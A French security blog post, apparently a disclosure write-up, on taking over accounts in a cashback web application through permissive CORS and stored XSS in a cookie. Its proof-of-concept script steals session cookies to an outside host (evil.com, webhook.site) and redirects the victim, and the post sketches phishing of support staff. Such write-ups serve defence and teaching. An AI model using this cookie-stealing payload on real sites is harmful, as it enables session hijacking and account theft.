---
title: "Prise de contrôle d'un compte en un seul clic sur n'importe qu'elle site web"
description: "Comment une série de mauvaises pratiques web m’a permis de prendre définitivement le contrôle de n'importe quel compte en un seul clic, simplement en visitant un site web contenant un code malveillant"
pubDate: "Jul 08 2024"
heroImage: "../../assets/prise-de-controle-dun-compte-en-un-seul-clic-sur-nimporte-quelle-site-web.png"
---

## Introduction

Depuis plusieurs jours je me suis intéressé à une application de cashback francaise, au cours de mes premières analyses j’ai découvert plusieurs vulnérabilités critiques, dont une **IDOR**, une **Open Redirect & XSS reflected** et un **XSS stocked**. Ces failles m’ont poussé à approfondir mes connaissance sur le fonctionnement interne de la plateforme.

Une question s’est alors imposée : _Comment l’application identifie-t-elle ses utilisateurs et valide-t-elle l’attribution du cashback ?_

## Un communication inter-sites excessivement permissif

L’un des premiers comportements notables concerne la configuration CORS particulièrement permissive.
Sans entrer dans les détails techniques à ce stade, l’application autorisé des requêtes JavaScript provenant de domaines tiers, facilitant ainsi des échanges inter-sites qui peuvent représenter un risque de sécurité important comme nous allons le voir.

<figure class="text-center">
  <img
    src="/src/assets/attack-on-cors.svg"
    alt="attack on cors"
    class="mx-auto"
  />
  <figcaption>
    Qu'est-ce que le CORS (cross-origin resource sharing) - portswigger.net
  </figcaption>
</figure>

## Un cookie créé dans de mauvaises conditions

En analysant le parcours utilisateur classique pour accéder à du cashback vers une boutique partenaire, deux endpoints ont rapidement attiré mon attention :

1. **/crossite/put_val/** - Cet endpoint accepté deux paramètres, **member_id** et **uid**, puis crée un cookie nommé crossite[**member_id**] dans lequel il stocke directement la valeur de **uid**.

2. **/crossite/get_val/** - Et celui-ci renvoié la valeur du cookie précédemment stockée avec le parametre **member_id** correspondant.

> Exemple l'url suivante `https://www.disclosed.com/crossite/put_val/?member_id=dfalqsumqjfirtk86a2e68phkm&uid=6981065608542` créer le cookie **crossite6add22nupndc1leekfk7q33uip=6981065608542** et `https://www.disclosed.com/crossite/get_val/?member_id=dfalqsumqjfirtk86a2e68phkm` renvoyais **6981065608542**

Le paramètre **uid** était le plus intéressant puisque son contenu était refleté directement dans la reponse, j'ai alors injecté une balise script telle que `<script>alert(document.cookie)</script>` dans celui ci puis j'ai appeller le second point de terminaison.

![account-takeover-in-one-click-xss-screenshoot](@/assets/account-takeover-in-one-click-xss-screenshoot.webp)

Cela a pu confirmer la présence d’un XSS stocké, la charge s'étant exécutée avec succès depuis la valeur du cookie.

## Exemple de script

J'ai construit un script à titre de preuve de concept qui s'éxecute automatiquement au chargement de la page qui renvois les cookies sur un domain controller par l'attaquant et le redirige sur **https://example.com**

```javascript
(async () => {
  // https://www.disclosed.com/crossite/put_val/?member_id=dfalqsumqjfirtk86a2e68phkm&uid=<script>document.write('<img src="https://evil.com/?c='+document.cookie+'" onerror=location="https://example.com" />')</script>
  await fetch(
    "https://www.disclosed.com/crossite/put_val/?member_id=dfalqsumqjfirtk86a2e68phkm&uid=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%27%3c%69%6d%67%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%77%65%62%68%6f%6f%6b%2e%73%69%74%65%2f%61%38%39%63%34%66%36%66%2d%37%34%38%30%2d%34%64%38%62%2d%39%38%34%37%2d%34%62%61%34%38%63%61%64%39%65%65%33%3f%63%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%2b%27%22%20%6f%6e%65%72%72%6f%72%3d%6c%6f%63%61%74%69%6f%6e%3d%22%68%74%74%70%73%3a%2f%2f%65%78%61%6d%70%6c%65%2e%63%6f%6d%22%20%2f%3e%27%29%3c%2f%73%63%72%69%70%74%3e",
    {
      method: "GET",
      credentials: "include",
      mode: "cors",
    },
  );

  window.location.href =
    "https://www.disclosed.com/crossite/get_val/?member_id=dfalqsumqjfirtk86a2e68phkm";
})();
```

## Scénario d’attaque

Un attaquant aurais pu ciblé un compte avec des permission supperiere telle que le support de l'application grace à un formulaire de contact dédier pour chaque compte utilisateur, prétextant qu'une redirection ne fonctionne plus et idinquant un lien comme https://www.disclosed.com/redirection/marchand/darty/ ( cette etape est optionnel mais permet de s'assuré que la victime est connecté et que le cookie contenant sa session soit exposé ) puis par un lien vers n'importe qu'elle domaine qui contient la charge utile.

## Situation aggravante

En etant actuellement entrais de finalisé cette article je me suis appercu du faille logique totallement inssencé, je pensé dans un premier tempt que la session utilisateur etait uniquement lié à un cookie de session **PHPSESSID**, pour information les cookies de session sont comme leurs nom l'indique seulement existant durant une session de navigation et sont supprimé des que vous fermé votre page mais j'avais faux en découvrant qu'un autre cookie se chargé de restauré la session meme si l'utilisateur se deconnecté, changé son email ou change son mot de passe.

## Conclusion

Cette attaque a été rendue possible par une mauvaise implémentation du CORS et de la gestion des cookies. Bien que l'attaque nécessite une authentification préalable et que l'utilisateur ait cliqué sur au moins un lien de redirection vers une boutique affiliée au cashback, elle demeure néanmoins trés dangereuse. Car étant difficile à prédire, n'importe quel site web peut être utilisé pour stocker et exécuter la charge JavaScript de manière discrète, redirigeant la victime dans une fraction de seconde après avoir lu ses cookies. De plus, l'attaque peut maintenir une persistance du contrôle sur le compte de la victime qu'impote ses actions.
